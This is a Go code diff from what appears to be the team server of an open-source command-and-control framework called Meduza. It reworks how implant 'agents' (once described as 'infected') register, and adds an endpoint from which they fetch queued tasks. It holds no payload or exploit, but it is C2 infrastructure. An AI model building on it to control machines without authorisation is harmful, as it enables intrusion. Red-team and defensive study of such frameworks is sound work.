@@ -4,47 +4,40 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	"time"
 
-	"github.com/google/uuid"
 	"github.com/ksel172/Meduza/teamserver/internal/storage/redis"
 	"github.com/ksel172/Meduza/teamserver/models"
 )
 
 type CheckInController struct {
-	dal *redis.CheckInDAL
+	checkInDAL *redis.CheckInDAL
+	agentDAL   *redis.AgentDAL
 }
 
-func NewCheckInController(dal *redis.CheckInDAL) *CheckInController {
-	return &CheckInController{dal: dal}
+func NewCheckInController(checkInDAL *redis.CheckInDAL, agentDAL *redis.AgentDAL) *CheckInController {
+	return &CheckInController{checkInDAL: checkInDAL, agentDAL: agentDAL}
 }
 
-// Likely in the future we should standardize the register request an infected agent sends
-// so the logic below will change.
-// Example: the agent should send only the MotherboardID instead of the full UUMOID.
-// So uuid generation can remain on the server side - we can combine the same uuid
-// for agent.ID in the agent.Info.UUMOID field.
 func (cc *CheckInController) CreateAgent(w http.ResponseWriter, r *http.Request) {
-	var agent models.Agent
-	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
+
+	// Decode the received JSON into a C2Request
+	// NewC2Request sets agentStatus as uninitialized if that is not provided by the agent in the JSON
+	c2request := models.NewC2Request()
+	if err := json.NewDecoder(r.Body).Decode(&c2request); err != nil {
 		http.Error(w, fmt.Sprintf("Error decoding request body: %s", err.Error()), http.StatusBadRequest)
 	}
 
-	// Validate required information
-	if agent.Info.UUMOID == "" {
-		http.Error(w, "Missing UUMOID", http.StatusBadRequest)
+	// Validate if the received C2Request is valid
+	if !c2request.Valid() {
+		http.Error(w, "Invalid C2 request", http.StatusBadRequest)
+		return
 	}
 
-	// Generate uuid for Agent
-	id := uuid.New().String()
-	agent.ID = id
+	// Convert C2Request into Agent model
+	agent := c2request.IntoNewAgent()
 
-	// Set first contact variables
-	agent.FirstCallback = time.Now()
-	agent.ModifiedAt = time.Now()
-
-	// Create agent
-	if err := cc.dal.CreateAgent(agent); err != nil {
+	// Create agent in the redis db
+	if err := cc.checkInDAL.CreateAgent(agent); err != nil {
 		http.Error(w, fmt.Sprintf("Error registering agent: %s", err.Error()), http.StatusInternalServerError)
 		return
 	}
@@ -52,4 +45,29 @@ func (cc *CheckInController) CreateAgent(w http.ResponseWriter, r *http.Request)
 	// Return a response containing the agent for updating the client side
 	w.WriteHeader(http.StatusCreated)
 	json.NewEncoder(w).Encode(agent)
+}
+
+// Will be called by the agents to get their tasks/commands
+// The agent will send its ID in the query params,
+// need to protect by authentication at some points, because currently anyone requesting
+// the tasks will get them, however, only the agent should be able to.
+func (cc *CheckInController) GetTasks(w http.ResponseWriter, r *http.Request) {
+
+	// Get the agent ID from the query params
+	agentID := r.URL.Query().Get("id")
+	if agentID == "" {
+		http.Error(w, "Missing agent ID", http.StatusBadRequest)
+		return
+	}
+
+	// Get the tasks for the agent
+	tasks, err := cc.agentDAL.GetAgentTasks(r.Context(), agentID)
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Agent not found: %s", err.Error()), http.StatusNotFound)
+		return
+	}
+
+	// Return tasks as JSON
+	w.WriteHeader(http.StatusOK)
+	json.NewEncoder(w).Encode(tasks)
 }
